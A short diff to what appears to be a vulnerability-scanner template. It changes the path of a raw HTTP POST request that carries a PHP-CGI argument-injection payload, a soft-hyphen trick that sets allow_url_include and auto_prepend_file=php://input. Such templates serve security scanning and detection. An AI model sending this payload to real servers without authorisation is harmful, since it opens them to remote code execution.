@@ -14,7 +14,7 @@ info:
 requests:
   - raw:
       - |
-        POST /?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+        POST /index.php?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
